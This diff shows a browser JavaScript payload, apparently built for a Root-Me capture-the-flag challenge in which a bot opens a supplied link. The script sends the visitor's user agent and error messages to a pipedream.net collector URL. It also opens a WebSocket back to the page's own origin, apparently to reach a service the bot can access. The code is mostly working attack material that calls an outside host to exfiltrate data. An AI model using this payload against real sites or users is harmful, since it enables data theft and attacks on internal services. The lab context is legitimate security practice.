@@ -1,5 +1,6 @@
 <script>
-    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?cyka', {mode: 'no-cors'});
+    //way to see if the bot got my link
+    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?nav='+encodeURIComponent(window.navigator.userAgent), {mode: 'no-cors'});
     //websocket available
     window.WebSocket = window.WebSocket || window.MozWebSocket;
     if (!window.WebSocket) {
@@ -7,14 +8,14 @@
     }
 
     //launch connection
-    var websocket = new WebSocket('ws://ctf15.root-me.org/ws');
+    var websocket = new WebSocket('ws://' + window.origin + '/ws');
     websocket.onopen = start;
       websocket.onmessage = handleReply;
     
     websocket.onerror = function (error) {
         fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error=' + encodeURIComponent(error.message), {mode: 'no-cors'});
         setTimeout(() => {
-            websocket = new WebSocket('wss://ctf15.root-me.org/ws'); 
+            websocket = new WebSocket('ws://' + window.origin + '/ws'); 
         }, 5000);
     };
     websocket.onclose = function(message) {
